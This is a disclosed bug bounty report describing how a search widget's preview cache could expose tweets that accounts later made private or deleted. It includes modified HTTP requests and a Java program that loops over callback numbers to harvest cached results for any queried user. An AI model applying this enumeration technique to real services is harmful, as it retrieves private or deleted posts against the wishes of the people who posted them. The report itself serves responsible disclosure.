# Opportunity to obtain private tweets through search widget preview caches

## Report Details
- **Report ID**: 263760
- **URL**: https://hackerone.com/reports/263760
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-08-27T10:41:58.950Z
- **Disclosed**: 2017-11-11T03:29:27.509Z

## Reporter
- **Username**: csanuragjain
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
The search widget functionality at https://twitter.com/settings/widgets/new uses ██████████ to show search results.
Issue here is that ████ seems to be caching the results, despite of no-cache request header and I can force ██████ to show me the cached results.
So, if their is a user x who decides to change his profile from public to private, then I can use ██████████ to view his old tweets which are now private, provided his tweets were cached by ██████. Similarly, it can be used to restore deleted tweets of a user where caching was performed pre-deletion.

**Problem**

1) We can pass Accept-Encoding: gzip, deflate, br in request header to enforce server to show cache results
2) The callback function varies from __twttr.callbacks.tl_i1_preview_old to __twttr.callbacks.tl_i1000_preview_old (I assume). Due to this, url having __twttr.callbacks.tl_i1_preview_old is considered different from __twttr.callbacks.tl_i1000_preview_old. So I can get upto 1000 cache results calling callback function one by one.

**Steps to Reproduce**
*) You can use the sample program in below section to search for available cache for any twitter user,list etc. Make sure to use Accept-Encoding: gzip, deflate, br to enforce caching (program is including this header)
1) Navigate to https://twitter.com/settings/widgets/new
2) Search for countblank
3) Since countblank is private profile so only 2 tweets came which are not related to countblank account
4) Again search for countblank while intercepting the request in Burp Suite. You will see a call like below. Just send it to Repeater.
https://█████/widgets/timelines/preview?all_results=on&callback=__twttr.callbacks.tl_i<Number will vary here>_preview_old&do_not_track=false&expand_media=false&height=350&lang=en&query=<Search string>&safe_mode=on&suppress_response_codes=true&theme=light&timeline_type=search

5) Make the below changes to force seeing the cached result (Notice we added Accept-Encoding: gzip, deflate, br to enforce caching):

Original Request:
GET /widgets/timelines/preview?all_results=on&callback=__twttr.callbacks.tl_i<some number>_preview_old&do_not_track=false&expand_media=false&height=350&lang=en&query=countblank&safe_mode=on&suppress_response_codes=true&theme=light&timeline_type=search HTTP/1.1
Host: █████
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36
Accept: */*
Referer: https://twitter.com/settings/widgets/new
Accept-Language: en-US,en;q=0.8
Cookie: lang=en

New Request (Make sure to change to __twttr.callbacks.tl_i73_preview_old since this cache has not been overwritten by correct data):
GET /widgets/timelines/preview?all_results=on&callback=__██████ HTTP/1.1
Host: ███
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36
Accept: */*
Referer: https://twitter.com/settings/widgets/new
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cookie: lang=en

6) Forward the new request
7) You can now more than 2 tweets including private profile tweets. In case, you cant see much result then you need to change i73 to i1...i100 in callback function __twttr.callbacks.tl_i73_preview_old.
8) This happened since countblank tweet result was cached when it used to be public profile.
9) Similarly, if post caching tweet is deleted then this technique can help you retrieve that deleted tweet

**Sample program to retreive this cache**
```
	public static void getJSON()
	{
		try {
			String old="";
			Scanner s1=new Scanner(System.in);
			System.out.println("Enter query");
			String query=s1.nextLine();
			//String query="testAcc1989";
			Set<String> s=new HashSet<String>();
			for(int i=1;i<200;i++)
			{
				String url="https://█████/widgets/timelines/preview?all_results=on&callback=__twttr.callbacks.tl_i"+i+"█████";	
			Document doc = Jsoup.connect(url)
					.header("Host", "██████████")
					.header("Cache-control", "max-age=31556926").header("Cache-store", "max-age=31556926")
					.userAgent("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0")
					.header("Accept-Encoding", "gzip, deflate, br") // Caching 
					.ignoreContentType(true)
					.get();
			String newVal=doc.html().substring(doc.html().indexOf("config"));
			if(!old.equals(newVal) && s.add(newVal)){
			old=newVal;
			System.out.println("-------------------------------------------------------Callback url which have cache "+url);
			//System.out.println(doc.html()); //Use this to print cached version
			}
			}
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
```
**Risk**
This can be used to extract private and deleted tweets and other resources

**Resolution**
I can see the request header for no-cache being passed but somehow server is not respecting the same. Make sure that results are not cached and updated data is always presented to user.

## Attachments
- Cached_result_enforced_show_private_results_as_well.PNG
- No_cache_has_correct_response_of_2_tweet.PNG
- Search_widget_showing_only_2_result_for_countblank.PNG
